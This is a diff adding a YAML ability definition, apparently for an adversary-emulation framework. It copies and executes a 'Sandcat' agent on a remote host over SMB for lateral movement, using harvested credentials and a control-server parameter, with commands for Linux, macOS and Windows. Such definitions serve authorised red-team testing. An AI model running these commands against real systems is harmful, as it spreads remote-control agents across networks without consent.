@@ -1,0 +1,30 @@
+---
+
+- id: a1a12e72-80be-47dc-86c3-7dbe6745259c
+  name: Execute Sandcat on remote host (SMB)
+  description: Copy & execute 54ndc47 to remote host (SMB)
+  tactic: lateral-movement
+  technique:
+    attack_id: T1105
+    name: Remote File Copy
+  platforms:
+    linux:
+      sh:
+        command: |
+          python3 ./smbExec.py --target #{remote.service.smb} --cred #{remote.host.credentials} --server #{server}
+        payload: smbExec.py
+    darwin:
+      sh:
+        command: |
+          python3 ./smbExec.py --target #{remote.service.smb} --cred #{remote.host.credentials} --server #{server}
+        payload: smbExec.py
+    windows:
+      psh:
+        command: |
+          C:\Users\Public\smbExec.exe --target #{remote.service.smb} --cred #{remote.host.credentials} --server #{server}
+        payload: smbExec.exe
+      cmd:
+        command: |
+          C:\Users\Public\smbExec.exe --target #{remote.service.smb} --cred #{remote.host.credentials} --server #{server}
+        payload: smbExec.exe
+
